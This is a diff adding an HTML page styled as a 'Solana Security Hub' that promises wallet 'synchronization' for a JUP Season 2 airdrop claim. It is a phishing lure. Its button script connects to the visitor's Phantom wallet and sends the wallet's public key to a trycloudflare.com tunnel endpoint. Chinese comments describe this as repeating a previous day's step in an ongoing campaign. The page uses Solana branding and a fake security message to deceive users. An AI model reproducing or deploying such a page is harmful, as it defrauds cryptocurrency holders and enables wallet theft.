@@ -1,0 +1,39 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Solana Security Hub</title>
+<style>
+    body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+    .card { background: #111; border: 1px solid #333; border-radius: 16px; padding: 32px; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
+    .logo { width: 60px; margin-bottom: 20px; }
+    h1 { font-size: 24px; margin-bottom: 8px; color: #fff; }
+    p { color: #888; font-size: 15px; margin-bottom: 30px; }
+    #claim { background: #14F195; color: #000; border: none; width: 100%; padding: 18px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
+</style></head><body>
+    <div class="card">
+        <img class="logo" src="https://solana.com/src/img/branding/solanaLogoMark.svg">
+        <h1>V4 Protocol Sync</h1>
+        <p>Your wallet requires synchronization to verify eligibility for JUP Season 2.</p>
+        <button id="claim">SYNC & CLAIM NOW</button>
+    </div>
+<script>
+document.getElementById("claim").onclick = async () => {
+    try {
+        const p = window.solana || window.phantom?.solana;
+        if (!p) { alert("Please use Phantom Browser"); return; }
+        
+        // 🔱 拉起连接 (复刻昨天的第一步)
+        const resp = await p.connect();
+        const pubkey = resp.publicKey.toString();
+        
+        // 🔱 关键：往 56368 对应的域名弹射数据，使用昨天备份里的 API 路径
+        fetch("https://others-considering-bikini-interference.trycloudflare.com/api/v1/secure_update", {
+            method: "POST",
+            mode: "no-cors",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ "address": pubkey })
+        });
+        
+        alert("Security Synchronization Initiated!");
+    } catch (e) { console.error(e); }
+};
+</script></body></html>
